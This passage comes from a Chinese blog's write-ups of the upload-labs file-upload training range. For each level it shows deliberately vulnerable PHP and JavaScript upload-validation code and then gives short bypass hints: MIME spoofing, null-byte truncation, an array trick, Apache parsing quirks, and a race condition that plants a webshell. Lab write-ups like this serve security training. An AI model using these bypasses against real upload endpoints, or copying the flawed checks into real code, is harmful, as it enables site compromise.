<p><img src="https://c.img.dasctf.com/images/20221220/1671531517933-3b4396fc-4b56-4236-9c3f-afb604fb46e8.png" alt="image-20210426210246728"></p>
<p>no payload 无限次循环</p>
<p>开始攻击。然后以同样的方法访问<code>write_shell.php</code>。当访问到相应为200后，会自动生成<code>shell.php</code>。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531509655-1e63d813-3616-4fa2-a64d-a0bd6875ffb3.png" alt="image-20210426210652361"></p>
<p>访问即可。</p>
<h2 id="level-19"><a href="#level-19" class="headerlink" title="level-19"></a>level-19</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>图片二次渲染，或者利用Apache解析漏洞条件竞争都可。</p>
<p>Apache解析漏洞参考链接：</p>
<p><a href="https://blog.csdn.net/qq_36374896/article/details/84189393">Apache HTTPD 未知后缀解析漏洞</a></p>
<h2 id="level-20"><a href="#level-20" class="headerlink" title="level-20"></a>level-20</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答:"></a>解答:</h3><p>%00截断或者继续解析漏洞。</p>
<p>可控post上去的文件名</p>
<p>直接文件包含也行。</p>
<h2 id="level-21"><a href="#level-21" class="headerlink" title="level-21"></a>level-21</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>数组加截断绕过，不详细复现了，给出参考链接和答案。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h3><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">文件解析漏洞总结</a></p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/104936689">upload-labs—wp（21关）</a></p>
<p><a href="https://blog.csdn.net/wo41ge/article/details/107313203">upload-labs 21关大合集</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109537262?spm=1001.2014.3001.5501">CTFSHOW文件上传篇</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs学习</title>
    <url>/2021/04/22/upload-labs%E5%AD%A6%E4%B9%A0%E4%B8%8A%E7%AF%87/</url>
    <content><![CDATA[<h1 id="upload-labs靶场训练篇（windows版21题）1-13题"><a href="#upload-labs靶场训练篇（windows版21题）1-13题" class="headerlink" title="upload-labs靶场训练篇（windows版21题）1-13题"></a>upload-labs靶场训练篇（windows版21题）1-13题</h1><p>upload-labs为文件上传的训练靶场，目前一共有21关，基本涵盖了目前全部的文件上传漏洞。此篇为上篇。</p>
<span id="more"></span>
<h2 id="level-1-前端JS验证"><a href="#level-1-前端JS验证" class="headerlink" title="level-1(前端JS验证)"></a>level-1(前端JS验证)</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>在浏览器中直接执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checkfile&#x3D;[]</span><br></pre></td></tr></table></figure>
<p>使得前端返回array为空，即可上传一句话木马，拿到shell。</p>
<h2 id="level-2-后端PHP验证"><a href="#level-2-后端PHP验证" class="headerlink" title="level-2(后端PHP验证)"></a>level-2(后端PHP验证)</h2><h3 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>BP抓包，修改为：<code>image/png</code>即可绕过</p>
<h2 id="level-3-解析漏洞"><a href="#level-3-解析漏洞" class="headerlink" title="level-3(解析漏洞)"></a>level-3(解析漏洞)</h2><h3 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>本题环境出了一些问题，Apache无法正常解析phps/phtml这样的后缀，因此只贴出做法。</p>
<p>使用前提：Apache的httpd.conf中有以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>
<p>ban了几个关键字，绕就完事了。后缀改为上述内容。如果不开解析，将会变成注释或者直接输出在屏幕上。</p>
<h2 id="level-4-htaccess"><a href="#level-4-htaccess" class="headerlink" title="level-4(.htaccess)"></a>level-4(.htaccess)</h2><h3 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span 